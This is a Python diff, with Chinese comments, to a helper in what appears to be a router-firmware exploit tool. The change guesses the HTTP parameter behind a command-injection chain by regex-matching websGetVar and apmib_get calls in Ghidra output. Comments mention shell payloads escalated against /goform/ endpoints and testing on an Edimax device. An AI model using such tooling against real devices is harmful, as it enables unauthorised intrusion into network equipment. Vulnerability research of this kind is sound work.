@@ -14,6 +14,7 @@
 
 from __future__ import annotations
 
+import re
 import urllib.parse
 
 # 载荷按「由轻到重」排序：先试小的，崩了才加码，避免一上来就把服务打挂。
@@ -46,18 +47,40 @@ def guess_path(function: str, uri: str = "") -> str:
     return f"/goform/{function}"
 
 
+_RE_GETVAR = re.compile(r'webs?GetVar\s*\(\s*[^,()]+,\s*"([^"]{2,32})"')
+_RE_GETVAL = re.compile(r'GetValue\s*\(\s*"([^"]{2,32})"')
+_RE_APMIB = re.compile(r'apmib_get\s*\(\s*[^,()]+,\s*"([^"]{2,32})"')
+
+
 def guess_param(chain: dict) -> str:
-    """参数名：先用 source_param；没有就按常见的 "cmd"/"input" 兜底。"""
+    """猜这条链对应的 HTTP 参数名。
+
+    顺序：链上记的 source_param → **守卫代码里最后一个取参调用** → sink 实参里的常见名 → "input"。
+
+    为什么要看守卫：M3.2 有些链的源被归到 apmib_get（读配置）上，source_param 是空的，
+    但守卫代码里往往就有真正那句 `websGetVar(param_1,"bindrootAPmac",…)`。
+    取**最后一个**是因为它离汇最近，最可能是被拼进去的那个。
+    实测 Edimax 上取到过 bindrootAPmac，而兜底的 "input" 打过去全部 no-crash。
+    """
     p = (chain.get("source_param") or "").strip()
     if p:
         return p
+
+    guard = (chain.get("guard") or "").replace("\x00", "\n")
+    # 守卫里可能混着 Ghidra 的日志噪音，还会被换行拆开（websGetVar 换行 (param_1,"x"）。
+    # 先清掉噪音、再压成一行，正则才接得上 —— 实测不这么做只能匹配到第一处参数名。
+    guard = re.sub(r"\((?:GhidraScript|HeadlessAnalyzer)\)", " ", guard)
+    guard = re.sub(r"\s+", " ", guard)
+    for pat in (_RE_GETVAR, _RE_GETVAL, _RE_APMIB):
+        hits = pat.findall(guard)
+        if hits:
+            return hits[-1]
+
     args = chain.get("sink_args") or ""
-    m = None
     for name in ("cmd", "input", "ip", "name"):
         if name in args:
-            m = name
-            break
-    return m or "input"
+            return name
+    return "input"
 
 
 def shell_payloads(cmd: str) -> list[str]:
